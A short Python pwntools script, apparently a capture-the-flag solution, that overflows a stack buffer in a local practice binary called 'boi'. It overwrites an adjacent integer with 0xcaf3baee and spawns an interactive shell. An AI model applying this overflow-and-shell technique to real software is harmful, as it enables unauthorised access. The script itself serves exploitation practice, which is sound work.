from pwn import *


target = process('./boi')

# 0x14 bytes of gap between the start of our input and the target int
# 0xbeaf... 0x4 bytes is  what we will overwrite with 0xcaf3baee
payload = "0"*0x14 + p32(0xcaf3baee).decode()


target.send(payload)



#spawns shell 
target.interactive()
